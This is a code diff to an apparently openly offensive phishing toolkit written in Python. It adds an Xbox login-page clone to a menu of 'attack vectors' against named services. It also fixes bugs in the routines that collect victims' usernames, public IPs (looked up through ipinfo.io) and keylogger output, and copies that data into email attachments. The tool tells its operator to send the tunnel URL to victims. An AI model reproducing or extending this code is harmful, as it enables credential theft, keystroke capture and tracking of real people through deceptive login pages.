@@ -113,7 +113,7 @@ def runPhishing(page, customOption):  # Phishing pages selection menu
         copy_tree("WebPages/dropbox/", "Server/www/")
     elif page == 'eBay':
         copy_tree("WebPages/ebay/", "Server/www/")
-    elif page == 'MySpace':
+    elif page == 'Myspace':
         copy_tree("WebPages/myspace/", "Server/www/")
     elif page == 'PayPal':
         copy_tree("WebPages/paypal/", "Server/www/")
@@ -131,6 +131,8 @@ def runPhishing(page, customOption):  # Phishing pages selection menu
         copy_tree("WebPages/subitoit/", "Server/www/")
     elif page == 'PlayStation':
         copy_tree('WebPages/playstation/', "Server/www/")
+    elif page == 'Xbox':
+        copy_tree('WebPages/xbox/', "Server/www/")
 
     else:
         endMessage()
@@ -280,9 +282,9 @@ def randomLocalxpose(port):
     try:
         output = check_output(
             "grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
-        url = str(output).decode("utf-8")
-        print("\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}".format(
-            MAIN0, MAIN4, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
+        url = str(output.decode('utf-8'))
+        print("\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}{4}{1}".format(
+            MAIN0, MAIN4, MAIN3, port, url) + "{1}".format(MAIN0, MAIN4, MAIN3))
         print("\n")
     except CalledProcessError:
 
@@ -448,7 +450,7 @@ def mainMenu():
 ________________________________________________________________________________'''.format(MAIN3, MAIN4, MAIN2, MAIN0))
     print("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------".format(MAIN0, MAIN2))
     print(" {0}[{1}1{0}]{1} Facebook        {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation".format(MAIN0, MAIN2))
-    print(" {0}[{1}2{0}]{1} Google          {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency".format(
+    print(" {0}[{1}2{0}]{1} Google          {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency  {0}[{1}38{0}]{1} Xbox".format(
         MAIN0, MAIN2))
     print(" {0}[{1}3{0}]{1} LinkedIn        {0}[{1}15{0}]{1} iCloud         {0}[{1}27{0}]{1} DevianArt ".format(
         MAIN0, MAIN2))
@@ -623,6 +625,10 @@ ________________________________________________________________________________
         loadModule('PlayStation')
         customOption = ''
         runPhishing('PlayStation', customOption)
+    elif option == '38':
+        loadModule('Xbox')
+        customOption = ''
+        runPhishing('Xbox', customOption)
 
     else:
         endMessage()
@@ -901,14 +907,13 @@ def getCredentials(port):
             if len(lines) != 0:
                 writeLog('\n {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}'.format(
                     MAIN2, MAIN3, lines))
-                system('touch Server/CapturedData/usernames.txt && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt && cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt && rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
+                system("touch Server/CapturedData/usernames.txt && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt && cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt && echo -n '' > Server/www/usernames.txt")
 
-        creds.close()
 
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                ip = re.match('Victim Public IP: (.*.*.*)\n', lines).group(1)
+                ip = re.search("Victim Public IP: (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\n,\r]", lines).group(1)
                 user = re.match('Current logged in user: (a-z0-9)\n', lines)
                 resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                 ipinfo = json.loads(resp.read().decode(
@@ -937,8 +942,8 @@ def getCredentials(port):
             if len(lines) != 0:
                 writeLog(
                     '{0}...............................'.format(MAIN0, MAIN4))
-                writeLog(' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}{1}').format(
-                    MAIN3, MAIN2, lines)
+                writeLog(
+                    ' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}{1}'.format(MAIN3, MAIN2, lines))
                 system('touch Server/CapturedData/KeyloggerData.txt && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt && cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt && rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
                 writeLog(
                     '{0}...............................'.format(MAIN0, MAIN4))
